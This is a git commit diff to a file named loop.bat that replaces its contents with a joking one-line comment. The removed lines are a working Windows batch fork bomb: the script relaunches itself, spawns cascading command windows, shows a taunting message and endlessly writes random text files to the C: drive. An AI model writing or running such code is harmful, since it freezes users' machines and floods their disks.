199e55170fba7d4168e9f21abe261cbbf7f023d2
AmogusLeeway <86786324+AmogusLeeway@users.noreply.github.com>
2024-04-17 22:45:03 +0300

    Update loop.bat

--- loop.bat
+++ loop.bat
@@ -1,10 +1,1 @@
-@echo off
-cd c:\
-:loop
-start loop.bat
-start cmd /c start cmd /c start cmd /c start cmd
-msg * nah fam i will explode your pc and spam the c drive with txt files
-start explorer
-calc
-echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%.txt
-goto loop
+hmm i wonder what this could have been
